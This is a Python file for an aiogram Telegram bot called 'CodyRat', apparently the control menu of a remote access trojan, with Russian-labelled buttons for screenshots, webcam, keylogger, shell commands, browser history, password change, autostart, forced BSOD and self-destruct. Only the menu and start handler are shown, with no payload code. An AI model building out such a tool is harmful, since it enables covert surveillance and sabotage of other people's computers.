from aiogram import Router
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.filters import CommandStart

router = Router()

menu = ReplyKeyboardMarkup(keyboard=[
    [KeyboardButton(text="📸 Скриншот"), KeyboardButton(text="💻 Система")],
    [KeyboardButton(text="⚙️ Команда"), KeyboardButton(text="📁 Файлы")],
    [KeyboardButton(text="🔧 Процессы"), KeyboardButton(text="🔊 Громкость")],
    [KeyboardButton(text="🔴 Запись экрана"), KeyboardButton(text="📋 Буфер")],
    [KeyboardButton(text="🔔 Уведомление"), KeyboardButton(text="⏻ Питание")],
    [KeyboardButton(text="📷 Вебкамера"), KeyboardButton(text="🌐 Открыть URL")],
    [KeyboardButton(text="🔑 Кейлоггер"), KeyboardButton(text="🖱 Управление мышью")],
    [KeyboardButton(text="🔌 Wi-Fi сети"), KeyboardButton(text="⏰ Планировщик")],
    [KeyboardButton(text="📡 Интернет"), KeyboardButton(text="🎵 Медиа")],
    [KeyboardButton(text="📺 Дисплей"), KeyboardButton(text="🔐 Автозапуск")],
    [KeyboardButton(text="📦 Программы"), KeyboardButton(text="🌐 История браузера")],
    [KeyboardButton(text="🎨 Обои"), KeyboardButton(text="🖱 Поменять кнопки мыши")],
    [KeyboardButton(text="💬 Чат с ПК"), KeyboardButton(text="🔑 Сменить пароль")],
    [KeyboardButton(text="💥 BSOD"), KeyboardButton(text="🔒 Блокировка")],
    [KeyboardButton(text="💣 Самоуничтожение")],
], resize_keyboard=True)

@router.message(CommandStart())
async def start(message: Message):
    await message.answer("👋 <b>CodyRat</b>\n\nВыбери действие:", reply_markup=menu)
